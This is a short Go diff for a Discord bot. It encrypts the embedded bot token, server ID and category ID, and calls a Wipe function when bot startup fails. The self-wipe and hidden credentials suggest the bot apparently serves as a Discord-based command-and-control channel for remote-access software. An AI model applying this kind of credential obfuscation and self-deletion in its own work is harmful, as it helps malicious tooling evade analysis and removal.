@@ -16,7 +16,9 @@ import (
 var targetChannel string
 
 func Start() {
-	bot, err := discordgo.New("Bot " + store.BOT_TOKEN)
+	store.DecryptedServerID = utils.Decrypt(store.SERVER_ID)
+
+	bot, err := discordgo.New("Bot " + utils.Decrypt(store.BOT_TOKEN))
 	if err != nil {
 		utils.DebugLog(fmt.Sprintf("failed to create bot - %v", err))
 		funcs.Wipe(false)
@@ -34,7 +36,7 @@ func Start() {
 
 	registerCommands()
 
-	categoryID := store.CATEGORY_ID
+	categoryID := utils.Decrypt(store.CATEGORY_ID)
 	if categoryID == "" {
 		categoryID = discord.FindCategory(bot)
 	}
@@ -82,7 +84,7 @@ func handler(ses *discordgo.Session, msg *discordgo.MessageCreate) {
 	if name == "list" {
 		link := fmt.Sprintf(
 			"https://discord.com/channels/%s/%s",
-			store.SERVER_ID,
+			store.DecryptedServerID,
 			targetChannel,
 		)
 
